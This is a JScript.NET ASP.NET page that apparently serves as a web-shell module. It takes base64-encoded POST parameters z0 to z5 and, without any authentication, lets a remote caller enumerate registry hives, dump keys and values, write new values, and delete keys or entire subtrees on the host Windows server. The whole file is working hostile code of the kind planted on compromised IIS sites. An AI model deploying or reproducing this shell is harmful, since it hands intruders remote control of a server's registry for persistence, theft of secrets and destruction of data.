<%

function base64Decode(str, encodingName) {
    if (!str || str === "") return "";

    var bytes = System.Convert.FromBase64String(str);

    var enc = encodingName
        ? System.Text.Encoding.GetEncoding(encodingName)
        : System.Text.Encoding.UTF8;

    return enc.GetString(bytes);
}

function Base64EncodeString(text : String) : String {
    if (!text) return "";
    var bytes : System.Byte[] = System.Text.Encoding.UTF8.GetBytes(text);
    return System.Convert.ToBase64String(bytes);
}

function ValidatePath(path : String) : Boolean {
    var regex = /^HKEY_(LOCAL_MACHINE|CURRENT_USER|USERS|CLASSES_ROOT|CURRENT_CONFIG)\\[A-Za-z0-9_\\\-]+$/i;
    return regex.test(path);
}

function ValidateValueName(name : String) : Boolean {
    if (name == "") return true;
    var regex = /^[A-Za-z0-9 _\-]+$/i;
    return regex.test(name);
}

function EscapeJson(str : String) : String {
    if (!str) return "";
    return str.replace(/\\/g, "\\\\").replace(/"/g, "\\\"");
}

function GetRegistryValueKind(typeStr : String) : Microsoft.Win32.RegistryValueKind {
    switch (typeStr.toUpperCase()) {
        case "REG_SZ": return Microsoft.Win32.RegistryValueKind.String;
        case "REG_EXPAND_SZ": return Microsoft.Win32.RegistryValueKind.ExpandString;
        case "REG_BINARY": return Microsoft.Win32.RegistryValueKind.Binary;
        case "REG_DWORD": return Microsoft.Win32.RegistryValueKind.DWord;
        case "REG_MULTI_SZ": return Microsoft.Win32.RegistryValueKind.MultiString;
        case "REG_QWORD": return Microsoft.Win32.RegistryValueKind.QWord;
        default: return Microsoft.Win32.RegistryValueKind.String;
    }
}

function GetRegistryValueKindString(kind : Microsoft.Win32.RegistryValueKind) : String {
    switch (kind) {
        case Microsoft.Win32.RegistryValueKind.String: return "REG_SZ";
        case Microsoft.Win32.RegistryValueKind.ExpandString: return "REG_EXPAND_SZ";
        case Microsoft.Win32.RegistryValueKind.Binary: return "REG_BINARY";
        case Microsoft.Win32.RegistryValueKind.DWord: return "REG_DWORD";
        case Microsoft.Win32.RegistryValueKind.MultiString: return "REG_MULTI_SZ";
        case Microsoft.Win32.RegistryValueKind.QWord: return "REG_QWORD";
        default: return "REG_NONE";
    }
}

function GetHiveKey(path : String) : Microsoft.Win32.RegistryKey {
    var upper = path.toUpperCase();
    if (upper.indexOf("HKEY_LOCAL_MACHINE") == 0) return Microsoft.Win32.Registry.LocalMachine;
    if (upper.indexOf("HKEY_CURRENT_USER") == 0) return Microsoft.Win32.Registry.CurrentUser;
    if (upper.indexOf("HKEY_USERS") == 0) return Microsoft.Win32.Registry.Users;
    if (upper.indexOf("HKEY_CLASSES_ROOT") == 0) return Microsoft.Win32.Registry.ClassesRoot;
    if (upper.indexOf("HKEY_CURRENT_CONFIG") == 0) return Microsoft.Win32.Registry.CurrentConfig;
    return null;
}

function CheckHives() : String {
    var hkcr = false;
    var hkcu = false;
    var hklm = false;
    var hku  = false;
    var hkcc = false;

    try { if (Microsoft.Win32.Registry.ClassesRoot != null) { Microsoft.Win32.Registry.ClassesRoot.GetSubKeyNames(); hkcr = true; } } catch(e) {}
    try { if (Microsoft.Win32.Registry.CurrentUser != null) { Microsoft.Win32.Registry.CurrentUser.GetSubKeyNames(); hkcu = true; } } catch(e) {}
    try { if (Microsoft.Win32.Registry.LocalMachine != null) { Microsoft.Win32.Registry.LocalMachine.GetSubKeyNames(); hklm = true; } } catch(e) {}
    try { if (Microsoft.Win32.Registry.Users != null) { Microsoft.Win32.Registry.Users.GetSubKeyNames(); hku = true; } } catch(e) {}
    try { if (Microsoft.Win32.Registry.CurrentConfig != null) { Microsoft.Win32.Registry.CurrentConfig.GetSubKeyNames(); hkcc = true; } } catch(e) {}

    return '{"HKEY_CLASSES_ROOT":' + hkcr + ',"HKEY_CURRENT_USER":' + hkcu + ',"HKEY_LOCAL_MACHINE":' + hklm + ',"HKEY_USERS":' + hku + ',"HKEY_CURRENT_CONFIG":' + hkcc + '}';
}

function ScanRegistry(base_path : String) : String {
    try {
        // 1. Clean up trailing backslash if it exists (e.g., "HKLM\Software\" -> "HKLM\Software")
        if (base_path.length > 19 && base_path.substr(base_path.length - 1) == "\\") {
            base_path = base_path.substring(0, base_path.length - 1);
        }

        // 2. Extract and validate the base Root Hive Key
        var rootKey : Microsoft.Win32.RegistryKey = GetHiveKey(base_path);
        if (rootKey == null) {
            return '{"success":false,"error":"Invalid root hive","subkeys":[],"values":[]}';
        }

        // 3. Extract the sub-path safely
        var subPath = "";
        var slashIndex = base_path.indexOf("\\");
        if (slashIndex != -1) {
            subPath = base_path.substring(slashIndex + 1);
        }

        // 4. Open the SubKey (If subPath is empty, open the rootKey itself)
        var targetKey : Microsoft.Win32.RegistryKey = null;
        if (subPath == "") {
            targetKey = rootKey;
        } else {
            targetKey = rootKey.OpenSubKey(subPath, false);
        }
        
        if (targetKey == null) {
            return '{"success":false,"error":"Key not found or access denied","subkeys":[],"values":[]}';
        }

        // 5. Gather SubKeys
        var subkeysArr = targetKey.GetSubKeyNames();
        var subkeysList = [];
        for (var i = 0; i < subkeysArr.length; i++) {
            subkeysList.push('"' + EscapeJson(base_path + "\\" + subkeysArr[i]) + '"');
        }

        // 6. Gather Values and Data
        var valuesArr = targetKey.GetValueNames();
        var valuesList = [];
        for (var j = 0; j < valuesArr.length; j++) {
            var vName = valuesArr[j];
            var vKind = targetKey.GetValueKind(vName);
            var rawVal = targetKey.GetValue(vName);
            var vDataStr = "";

            if (vKind == Microsoft.Win32.RegistryValueKind.Binary) {
                var bytes : System.Byte[] = rawVal;
                var sb = new System.Text.StringBuilder();
                for (var b = 0; b < bytes.length; b++) {
                    sb.Append(bytes[b].ToString("X2"));
                }
                vDataStr = sb.ToString();
            } else if (vKind == Microsoft.Win32.RegistryValueKind.MultiString) {
                vDataStr = String(rawVal).replace(/,/g, "\\0");
            } else {
                vDataStr = String(rawVal);
            }

            var base64Data = Base64EncodeString(vDataStr);
            valuesList.push('{"name":"' + EscapeJson(vName) + '","type":"' + GetRegistryValueKindString(vKind) + '","data":"' + base64Data + '"}');
        }

        // Only close it if it was a opened SubKey; do not close the global root static objects
        if (subPath != "") {
            targetKey.Close();
        }

        return '{"success":true,"error":null,"subkeys":[' + subkeysList.join(",") + '],"values":[' + valuesList.join(",") + ']}';

    } catch(e) {
        return '{"success":false,"error":"' + EscapeJson(e.message) + '","subkeys":[],"values":[]}';
    }
}

function SetValue(path : String, name : String, rtype : String, data : String) : String {
    if (!ValidatePath(path) || !ValidateValueName(name)) {
        return '{"success":false,"error":"Invalid path or name"}';
    }
    try {
        var rootKey : Microsoft.Win32.RegistryKey = GetHiveKey(path);
        var subPath = path.substring(path.indexOf("\\") + 1);
        var targetKey : Microsoft.Win32.RegistryKey = rootKey.OpenSubKey(subPath, true);
        
        if (targetKey == null) {
            targetKey = rootKey.CreateSubKey(subPath);
        }

        var kind = GetRegistryValueKind(rtype);
        
        if (kind == Microsoft.Win32.RegistryValueKind.DWord || kind == Microsoft.Win32.RegistryValueKind.QWord) {
            targetKey.SetValue(name, System.Convert.ToInt64(data), kind);
        } else if (kind == Microsoft.Win32.RegistryValueKind.Binary) {
            var numberChars = data.Length;
            var bytes : System.Byte[] = new System.Byte[numberChars / 2];
            for (var i = 0; i < numberChars; i += 2) {
                bytes[i / 2] = System.Convert.ToByte(data.Substring(i, 2), 16);
            }
            targetKey.SetValue(name, bytes, kind);
        } else {
            targetKey.SetValue(name, data, kind);
        }
        
        targetKey.Close();
        return '{"success":true}';
    } catch(e) {
        return '{"success":false,"error":"' + EscapeJson(e.message) + '"}';
    }
}

function DeleteKey(path : String) : String {
    if (!ValidatePath(path)) {
        return '{"success":false,"error":"Invalid path"}';
    }
    try {
        var rootKey : Microsoft.Win32.RegistryKey = GetHiveKey(path);
        var subPath = path.substring(path.indexOf("\\") + 1);
        rootKey.DeleteSubKeyTree(subPath);
        return '{"success":true}';
    } catch(e) {
        return '{"success":false,"error":"' + EscapeJson(e.message) + '"}';
    }
}

function DeleteValue(path : String, name : String) : String {
    if (!ValidatePath(path) || !ValidateValueName(name)) {
        return '{"success":false,"error":"Invalid inputs"}';
    }
    try {
        var rootKey : Microsoft.Win32.RegistryKey = GetHiveKey(path);
        var subPath = path.substring(path.indexOf("\\") + 1);
        var targetKey : Microsoft.Win32.RegistryKey = rootKey.OpenSubKey(subPath, true);
        if (targetKey != null) {
            targetKey.DeleteValue(name, false);
            targetKey.Close();
            return '{"success":true}';
        }
        return '{"success":false,"error":"Key path not found"}';
    } catch(e) {
        return '{"success":false,"error":"' + EscapeJson(e.message) + '"}';
    }
}

Response.ContentType = "application/json";
Response.ContentEncoding = System.Text.Encoding.UTF8;

Server.ScriptTimeout = 900;

var action  = base64Decode(Request.Form["z0"], "utf-8");
var z1      = base64Decode(Request.Form["z1"], "utf-8");
var z2      = base64Decode(Request.Form["z2"], "utf-8");
var z3      = base64Decode(Request.Form["z3"], "utf-8");
var z4      = base64Decode(Request.Form["z4"], "utf-8");
var z5      = base64Decode(Request.Form["z5"], "utf-8");

switch (String(action)) {
    case "hive":
        Response.Write(CheckHives());
        break;
        
    case "scan":
        Response.Write(ScanRegistry(z2));
        break;
        
    case "set":
    case "new_value":
        Response.Write(SetValue(z2, z3, z4, z5));
        break;
        
    case "del_key":
        Response.Write(DeleteKey(z2));
        break;
        
    case "del_value":
        Response.Write(DeleteValue(z2, z3));
        break;
        
    default:
        Response.Write('{"success":false,"error":"Unknown or unhandled action"}');
        break;
}

%>